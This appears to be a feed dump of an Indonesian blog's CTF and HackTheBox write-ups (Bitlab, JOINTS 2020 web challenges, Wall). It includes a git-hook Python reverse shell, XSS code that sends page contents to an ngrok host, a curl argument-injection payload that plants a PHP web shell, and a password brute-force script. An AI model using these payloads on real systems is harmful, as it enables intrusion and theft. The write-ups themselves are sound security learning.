&lt;p&gt;Oke mulai privilege escalationnya, pertama saya copy folder &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/profile&lt;/code&gt; ke folder &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; dan membuat &lt;code class=&quot;highlighter-rouge&quot;&gt;post-merge&lt;/code&gt; pada .git/hooks&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bitlab:/tmp$ cp -r /var/www/html/profile .
www-data@bitlab:/tmp$ cd profile
www-data@bitlab:/tmp/profile$ cd .git 
www-data@bitlab:/tmp/profile/.git$ ls
FETCH_HEAD  ORIG_HEAD  config	    hooks  info  objects      refs
HEAD	    branches   description  index  logs  packed-refs
www-data@bitlab:/tmp/profile/.git$ cd hooks
www-data@bitlab:/tmp/profile/.git/hooks$ cat &amp;gt; post-merge &amp;lt;&amp;lt; 'EOF'
&amp;gt; #!/bin/bash
&amp;gt; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.115&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
&amp;gt; EOF
www-data@bitlab:/tmp/profile/.git/hooks$ cat post-merge
#!/bin/bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.115&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
www-data@bitlab:/tmp/profile/.git/hooks$ chmod +x post-merge
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Bisa dibaca kan?&lt;/em&gt; oke, karena ketika saya git pull ternyata sudah up to date maka saya mencoba melakukan merge pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;profile&lt;/code&gt; seperti awal tadi dan melakukan &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo git pull&lt;/code&gt; di directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/profile&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bitlab:/tmp/profile$ cp -r /var/www/html/profile/* . # nah pas ini baru diklik merge
www-data@bitlab:/tmp/profile$ sudo git pull
remote: Enumerating objects: 1, done.
remote: Counting objects: 100% (1/1), done.
remote: Total 1 (delta 0), reused 0 (delta 0)
Unpacking objects: 100% (1/1), done.
From ssh://localhost:3022/root/profile
   c2e2077..5b34904  master     -&amp;gt; origin/master
Updating c2e2077..5b34904
Fast-forward
 hello.php | 3 +++
 1 file changed, 3 insertions(+)
 create mode 100644 hello.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Disini listener saya mendapat respon yang berarti command berhasil dieksekusi&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/htb/gitlab# nc -vlp 1234
listening on [any] 1234 ...
10.10.10.114: inverse host lookup failed: Unknown host
connect to [10.10.14.115] from (UNKNOWN) [10.10.10.114] 49358
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
8d4cc131757957cb68d9a0cddccd587c
# ls /home
clave
# cat /home/clave/user.txt
1e3fd81ec3aa2f1462370ee3c20b8154
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nahkan langsung dapet dua flag &lt;em&gt;wkwkwk&lt;/em&gt;. Ngomong ngomong writeup ini agak ribet dan untuk yang kurang jelas bisa kontak telegram saya &lt;a href=&quot;https://t.me/bl33dz&quot;&gt;@bl33dz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Dan kalo bisa &lt;em&gt;Respect&lt;/em&gt; akun hackthebox saya yang ada dibawah ini.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.</summary></entry><entry><title type="html">[JOINTS2020] Writeup Category Web</title><link href="http://bl33dz.github.io/2020/05/04/web-joints.html" rel="alternate" type="text/html" title="[JOINTS2020] Writeup Category Web" /><published>2020-05-04T00:00:00+07:00</published><updated>2020-05-04T00:00:00+07:00</updated><id>http://bl33dz.github.io/2020/05/04/web-joints</id><content type="html" xml:base="http://bl33dz.github.io/2020/05/04/web-joints.html">&lt;p&gt;Setelah beberapa &lt;del&gt;abad&lt;/del&gt; bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.&lt;/p&gt;

&lt;p&gt;Karena ternyata bisa nyelesain semua soal category web (&lt;del&gt;sombong dikit&lt;/del&gt;), akhirnya jadilah artikel ke tiga pada blog ini. Berikut adalah daftar challenge category web pada CTF JOINTS 2020.&lt;/p&gt;

&lt;h2 id=&quot;ezstringmatching&quot;&gt;ezStringMatching&lt;/h2&gt;

&lt;p&gt;Diberikan sebuah website beralamatkan (http://ctf.joints.id:40002/) dan ketika saya lihat source web tersebut tidak ada yang mencurigakan. Maka saya mencoba melihat header dari website tersebut.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/web# curl -I http://ctf.joints.id:40002/
HTTP/1.1 200 OK
Host: ctf.joints.id:40002
Date: Sun, 03 May 2020 18:31:31 GMT
Connection: close
X-Powered-By: PHP/7.2.30
Debug: ?debug=v
Content-type: text/html; charset=UTF-8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dalam header tersebut terdapat parameter untuk melakukan debug pada web tersebut dan ketika saya melakukan debug saya mendapatkan source code web tersebut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ezstring1.png&quot; alt=&quot;ezstring1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dari source code diatas saya menyimpulkan untuk mendapatkan kita harus memiliki string yang berbeda namun memiliki hash md5 yang sama. Ketika saya mencari referensi di google saya menemukan link berikut ini (&lt;a href=&quot;https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/PHP%20juggling%20type&quot;&gt;github&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Maka ketika saya inputkan &lt;code class=&quot;highlighter-rouge&quot;&gt;240610708&lt;/code&gt; pada String 1 dan &lt;code class=&quot;highlighter-rouge&quot;&gt;QNKCDZO&lt;/code&gt; pada String 2 flag dari challenge ini akan ditampilkan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ezstring2.png&quot; alt=&quot;ezstring2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;JOINTS20{b4by_typ3_ju99lin9_md5_}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;under-construction&quot;&gt;Under Construction&lt;/h2&gt;

&lt;p&gt;Diberikan sebuah website beralamatkan (http://ctf.joints.id:20002/) ketika dibuka website tersebut menampilkan login page, dan karena terdapat page register maka saya langsung register dan melakukan login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/under1.png&quot; alt=&quot;under1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lalu saya mencoba melihat bagian fitur feedback dan mendapati bahwa fitur tersebut memiliki bug xss setelah mencoba memasukkan payload xsshunter pada fitur tersebut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/under3.png&quot; alt=&quot;under3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/under2.png&quot; alt=&quot;under2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Namun sayangnya saya tidak mendapatkan cookies dari user admin tersebut, maka dari itu saya mencoba membuat script xss sendiri untuk mengambil flag dari web tersebut&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function get_output(uri) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            send_output(xhr.responseText);
        }
    }
    xhr.open('GET', uri, true);
    xhr.send(null);
}

function send_output(data) {
    var url = 'http://3d4b1f3c.ngrok.io/x.php';
    var xhr = new XMLHttpRequest();
    xhr.open( &quot;POST&quot;, url, true);
    xhr.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
    xhr.send(&quot;body=&quot;+encodeURI(data));
    return xhr.responseText;
}

get_output(&quot;/flag&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lalu saya juga membuat file PHP baru untuk melakukan listening agar dapat menerima output yang dikirim dari xss tersebut.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'body'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;output.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Setelah itu saya save kedua file diatas pada localhost dan melakukan port forwarding menggunakan ngrok. Lalu saya mengeksekusi code yang saya buat pada bagian feedback.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javascript:eval('var a=document.createElement(\'script\');a.src=\'http://3d4b1f3c.ngrok.io/x.js\';document.body.appendChild(a)')
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/under4.png&quot; alt=&quot;under4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dari screenshot diatas membuktikan bahwa terdapat request dari victim ke localhost saya. Saya pun mencoba melihat result dari &lt;code class=&quot;highlighter-rouge&quot;&gt;output.txt&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/xss# cat output.txt | grep JOINTS
YOUR TREASURE : JOINTS20{Cust0m_R3diRecT_For_TH3_w1n}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;JOINTS20{Cust0m_R3diRecT_For_TH3_w1n}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;l333t&quot;&gt;l333t&lt;/h2&gt;

&lt;p&gt;Diberikan sebuah website (http://ctf.joints.id:1337/) hampir mirip dengan web pertama, saya melakukan register dan login. Lalu mendapati tampilan seperti dibawah.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/l333t1.png&quot; alt=&quot;l333t1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lalu saya mencoba melakukan xss pada bagian submit dan ternyata memiliki celah xss yang sama dengan challenge &lt;code class=&quot;highlighter-rouge&quot;&gt;Under Construction&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/l333t2.png&quot; alt=&quot;l333t2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/l333t3.png&quot; alt=&quot;l333t3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dan boom, tampilannya ternyata sama persis dengan web sebelumnya, maka dari itu saya mencoba melakukan trik yang sama dengan web sebelumnya. Saya menggunakan script js yang sama seperti sebelumnya.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function get_output(uri) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            send_output(xhr.responseText);
        }
    }
    xhr.open('GET', uri, true);
    xhr.send(null);
}

function send_output(data) {
    var url = 'http://3d4b1f3c.ngrok.io/x.php';
    var xhr = new XMLHttpRequest();
    xhr.open( &quot;POST&quot;, url, true);
    xhr.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
    xhr.send(&quot;body=&quot;+encodeURI(data));
    return xhr.responseText;
}

get_output(&quot;/flag&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lalu saya juga menggunakan file PHP yang sebelumnya untuk melakukan listening agar dapat menerima output yang dikirim dari xss tersebut.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'body'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;output.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Setelah itu saya save kedua file diatas pada localhost dan melakukan port forwarding menggunakan ngrok. Lalu saya mengeksekusi code yang saya buat pada bagian submit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javascript:eval('var a=document.createElement(\'script\');a.src=\'http://3d4b1f3c.ngrok.io/x.js\';document.body.appendChild(a)')
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/l333t4.png&quot; alt=&quot;l333t4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dan setelah itu saya cek lagi file outputnya dan ternyata muncul flag yang baru.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/xss# cat output.txt | grep JOINTS
Here you go admin : JOINTS20{L333T_k1dz_Pl4y_with_CrLF_and_CORS_31337}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;JOINTS20{L333T_k1dz_Pl4y_with_CrLF_and_CORS_31337}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;twitter-collection&quot;&gt;Twitter Collection&lt;/h2&gt;

&lt;p&gt;Diberikan sebuah website beralamat (http://ctf.joints.id:10001/), web tersebut berfungsi untuk mengambil gambar dari twitter dan menyimpannya pada server tersebut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/twitter1.png&quot; alt=&quot;twitter1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ketika saya memasukkan gambar yang ada pada contoh website akan menampilkan seperti berikut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/twitter2.png&quot; alt=&quot;twitter2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bisa dilihat terdapat gambar mona yang sangat cantik (tapi cantikan iofi), dan ketika diklik akan menuju pada lokasi asli gambar tersebut&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://ctf.joints.id:10001/downloads/c941dc6d992361c4eccc99ffdbaaf98c3392200f/[namafile]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Saya agak lupa lokasi file saya karena waktu mengerjakan soal ini, posisi saya sedang pada Ubuntu. Saya mencoba mendapatkan error dan melihat Inspect -&amp;gt; Network lalu mendapatkan output seperti berikut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/twitter3.png&quot; alt=&quot;twitter3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Saya pun yakin bahwa ketika melakukan request ke url, web tersebut menggunakan curl namun dengan system,passthru,shell_exec atau sejenisnya. Saya lalu mencoba melakukan command injection dan ternyata terdapat banyak filter yang sangat menggangu.&lt;/p&gt;

&lt;p&gt;Akhirnya saya mendapat ide untuk menggunakan curl agar dapat mengupload web shell pada web tersebut. Untuk trik yang saya gunakan sebenarnya sederhana saya hanya perlu menambahkan url lain setelah url twitter dan menyimpannya pada server dengan option &lt;code class=&quot;highlighter-rouge&quot;&gt;-o&lt;/code&gt; pada curl.&lt;/p&gt;

&lt;p&gt;Berikut script PHP yang saya buat.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Simpan file diatas dengan extensi &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt; dan taruh pada localhost lalu lakukan port forwarding. Berikut payload yang sudah ada dipikiran saya.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://pbs.twimg.com/&quot; &quot;http://3d4b1f3c.ngrok.io/x.txt&quot; -o &quot;x.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Nah disini ternyata saya juga mendapatkan error lagi karena ternyata string “php” terkena filter. Wahhh puasa puasa mempersulit orang lain. Lalu saya mencoba memperbaiki payload saya agar dapat melewati filter tersebut.&lt;/p&gt;

&lt;p&gt;Final Payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;https://pbs.twimg.com/&quot; &quot;http://3d4b1f3c.ngrok.io/x.txt&quot; -o &quot;x.ph&quot;&quot;p&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Dan boom, ternyata file saya sudah terupload dan terdapat pada bagian folder yang sama dengan gambar diatas tadi&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://ctf.joints.id:10001/downloads/c941dc6d992361c4eccc99ffdbaaf98c3392200f/x.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Maka saya hanya perlu mencari lokasi flag dengan webshell diatas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/twitter4.png&quot; alt=&quot;twitter4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;JOINTS20{ya_benar_ini_benderanya_uwu}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Sekian writeup yang bisa saya tulis, mohon maaf kalau tulisannya jelek soalnya tadi dikejar deadline pengumpulan writeup (mager juga suruh baca ulang). Dan jikalau saya ada salah kata mohon maaf.&lt;/p&gt;

&lt;p&gt;Sampai ketemu di next artikel.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="ctf" /><category term="web" /><category term="xss" /><category term="rce" /><summary type="html">Setelah beberapa abad bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.</summary></entry><entry><title type="html">[HTB] Wall</title><link href="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html" rel="alternate" type="text/html" title="[HTB] Wall" /><published>2019-12-07T00:00:00+07:00</published><updated>2019-12-07T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/07/hackthebox-wall</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html">&lt;p&gt;Ya, akhirnya machine Wall ini retired dan digantikan machine baru &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/220&quot;&gt;Resolute&lt;/a&gt; (Windows) dan  sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.157&lt;/code&gt;. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.&lt;/p&gt;

&lt;p&gt;Pertama, kaya biasa scan scan dulu pake nmap siapa tau nemu jalan &lt;del&gt;ke hatinya&lt;/del&gt; buat dapetin flag.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; nmap -sV -sC -sT  10.10.10.157 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-07 06:17 WIB
Nmap scan report for 10.10.10.157
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.33 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Dari output diatas kita bisa lihat bahwa machine tersebut memiliki 2 port yang terbuka yaitu port http dan port ssh. Sepertinya port http cuma nampilin default page dan di ssh gaada yang mencurigakan. Maka dari itu langsung saja kita bruteforce directory pada port httpnya.&lt;/p&gt;

&lt;p&gt;Nah singkat cerita saya nemuin directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/monitoring/&lt;/code&gt; namun sayang directory tersebut diproteksi dengan autentikasi http. Disini saya stuck lumayan lama, namun setelah lihat &lt;del&gt;yang seger seger&lt;/del&gt; beberapa clue di forum, ada sebuah clue yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP Verb&lt;/code&gt;. HTTP Verb ini sama dengan HTTP Method yaitu GET,POST,HEAD,dan lain lain maka langsung saya coba melakukan request POST ke directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/monitoring/&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; curl -X POST http://10.10.10.157/monitoring/
&amp;lt;h1&amp;gt;This page is not ready yet !&amp;lt;/h1&amp;gt;
&amp;lt;h2&amp;gt;We should redirect you to the required page !&amp;lt;/h2&amp;gt;

&amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; URL='/centreon'&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Boom, saya mendapat directory baru yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;/centreon/&lt;/code&gt;. Ketika saya buka directory tersebut saya mendapat tampilan seperti berikut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wall-1.png&quot; alt=&quot;wall-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Karena di halaman tersebut terdapat versi dari webapps tersebut saya mencoba mencari exploitnya dan akhirnya menemukan exploit dari webapps tersebut. Namun, ternyata kita harus login dahulu sebelum melakukan exploit pada webapps tersebut. Maka saya mencoba membuat script sederhana untuk melakukan bruteforcing.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pass &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/nmap/nselib/data/passwords.lst&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl http://10.10.10.157/centreon/api/index.php?action&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;authenticate &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=admin&amp;amp;password=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; | jq &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Bad credentials&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Username: admin&quot;&lt;/span&gt;
		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Password: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
		&lt;span class=&quot;nb&quot;&gt;break
	&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

